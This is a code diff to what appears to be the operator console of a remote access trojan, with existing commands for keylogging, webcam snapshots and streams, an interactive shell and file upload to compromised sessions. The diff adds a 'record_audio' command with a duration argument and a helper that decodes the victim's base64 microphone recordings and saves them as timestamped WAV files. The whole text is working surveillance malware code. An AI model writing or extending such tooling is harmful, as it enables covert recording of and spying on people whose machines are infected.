@@ -281,10 +281,16 @@ def interact_with_session(session_id: int) -> None:
                 "keylogger",
                 "webcam_snapshot",
                 "webcam_stream",
-                "record_audio",
             ):
                 response = send_command_and_recv(conn, command)
                 _print_response(response)
+
+            # --- record_audio [duration] ---
+            elif command == "record_audio" or command.startswith("record_audio "):
+                parts = command.split(maxsplit=1)
+                duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
+                response = send_command_and_recv(conn, "record_audio", {"duration": duration})
+                _save_audio(response)
 
             # --- Shell interactif ---
             elif command == "shell":
@@ -428,6 +434,40 @@ def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
     response = decode_message(data.decode("utf-8").strip())
     print(response.get("output", "[?] Réponse inattendue"))
     logger.info("Fichier uploadé vers session %s : %s", session_id, local_path)
+
+
+def _save_audio(response: dict[str, Any]) -> None:
+    """
+    Decode the base64 WAV data from a record_audio response and save it locally.
+
+    The file is saved in a 'recordings/' folder with a timestamp in the name.
+
+    Args:
+        response: Agent response dict containing 'data' (base64 WAV) or 'error'.
+    """
+    import base64
+    import time
+    from pathlib import Path
+
+    if response.get("error"):
+        print(f"[!] record_audio error: {response['error']}")
+        return
+
+    raw_data = response.get("data", "")
+    if not raw_data:
+        print("[!] No audio data received.")
+        return
+
+    wav_bytes = base64.b64decode(raw_data)
+
+    save_dir = Path("recordings")
+    save_dir.mkdir(exist_ok=True)
+
+    filename = save_dir / f"audio_{int(time.time())}.wav"
+    filename.write_bytes(wav_bytes)
+
+    print(f"[+] Audio saved: {filename} ({len(wav_bytes)} bytes)")
+    logger.info("Audio recording saved to %s", filename)
 
 
 # ---------------------------------------------------------------------------
